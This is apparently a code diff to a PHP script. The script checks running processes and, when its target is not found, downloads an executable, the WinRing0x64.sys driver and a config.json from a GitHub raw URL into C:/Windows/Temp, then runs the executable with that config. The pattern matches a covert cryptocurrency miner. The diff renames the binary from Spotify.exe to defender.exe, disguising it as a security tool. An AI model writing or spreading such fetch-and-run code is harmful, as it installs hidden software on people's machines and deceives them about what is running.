@@ -51,7 +51,7 @@ function executeCommand($command) {
 
 
 $deletePaths = [
-    'C:/Windows/Temp/Spotify.exe',
+    'C:/Windows/Temp/defender.exe',
     'C:/Windows/Temp/WinRing0x64.sys',
     'C:/Windows/Temp/config.json',
 
@@ -61,14 +61,14 @@ $deletePaths = [
 
 
 
-$checkfile1 = 'C:/Windows/Temp/Spotify.exe';
+$checkfile1 = 'C:/Windows/Temp/defender.exe';
 
 exec('tasklist', $output);
 
-$url =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/Spotify.exe';
+$url =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/defender.exe';
 $url2 =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/WinRing0x64.sys';
 $url3 =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/config.json';
-$file_name = 'C:/Windows/Temp/Spotify.exe';
+$file_name = 'C:/Windows/Temp/defender.exe';
 $file_name2 = 'C:/Windows/Temp/WinRing0x64.sys';
 $file_name3 = 'C:/Windows/Temp/config.json';
 $found = false;
@@ -78,7 +78,7 @@ foreach ($output as $line) {
         $found = true;
 
     }
-    if (stripos(strtolower($line), 'ramjavawindows.exe') !== false) {
+    if (stripos(strtolower($line), 'defender.exe') !== false) {
         $found2 = true;
 
     }
@@ -96,7 +96,7 @@ if (!$found && !$found2) {
             {
             echo "File downloading failed.";
             }
-            system('C:/Windows/Temp/Spotify.exe -c C:/Windows/Temp/config.json');
+            system('C:/Windows/Temp/defender.exe -c C:/Windows/Temp/config.json');
 
         } else {
         system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
@@ -126,7 +126,7 @@ if (!$found && !$found2) {
             echo "File downloading failed.";
             }
 
-         system('C:/Windows/Temp/Spotify.exe -c C:/Windows/Temp/config.json');
+         system('C:/Windows/Temp/defender.exe -c C:/Windows/Temp/config.json');
         }
 
 
